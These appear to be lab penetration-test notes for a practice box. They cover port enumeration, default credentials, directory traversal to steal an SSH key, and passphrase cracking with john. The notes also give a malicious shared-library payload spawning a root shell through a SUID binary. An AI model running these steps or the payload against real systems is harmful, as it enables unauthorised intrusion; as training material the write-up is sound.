### Enumeration
```
IP=10.10.10.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80 -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
- 80
	- Apache httpd 2.4.52 ((Ubuntu))
### Foothold
- 80
	- Default landing page
		- ![[Pasted image 20240729072634.png]]
	- Versions
		- php file manager
	- Directory Brute force
		- dirsearch -u http://$IP
			- /files/
			- /readme
				- Default username/password: fm_admin/fm_admin
				- ![[Pasted image 20240729072704.png]]
	- Logged in
		- fm_admin_fm_admin
		- File system has 2 images
			- Metadata
				- exiv2 pexels-photo-20860153.jpeg
					- Nothing
				- foremost -i pexels-photo-20860153.jpeg
					- Nothing
		- Url bar
			- http://192.168.51.43/index.php?p=../
				- Loads us one directory higher. We have directory traversal
			- Went to home dir for brian. Found ssh keys
				- ![[Pasted image 20240729072911.png]]
			- Downloaded the files
			- Ssh2john id_rsa > id_rsa.hash
			- john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
				- eugene
			- Now we can ssh into the box as brian
### PE
#### Linux
- USERNAME
	- id
		- uid=1000(brian) gid=1000(brian) groups=1000(brian),33(www-data)
	- sudo -l
		- Uses different password than the ssh key
	- uname -a
		- `Linux backupbuddy 5.15.0-105-generic #115-Ubuntu SMP Mon Apr 15 09:52:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- /opt/backup
				- When trying to run it says  /home/brian/.config/libm.so is missing
				- We have write control over /home/brian
				- We create .config folder then import a malicious .so
				- Payload  libm.c
					```
					#include <stdlib.h>
					#include <unistd.h>
					
					__attribute__((constructor))
					void bad_stuff() {
					 setuid(0);
					 setgid(0);
					 system("/bin/sh -i");
					}
					```
				- Move libm.c to target
				- Compile:   gcc -shared -o libm.so -fPIC lib.c
				- chmod 777 libm.so
				- Launch suid   /opt/backup
				- Now we are rooted
	- Users with console
		- brian
		- root
	- netstat -ano
		- Active ports
		- No new ports
	- linpeas
		- Possible Exploits
		- Interesting Files
		- Nothing
	- pspy64
### Credentials
### Lessons Learned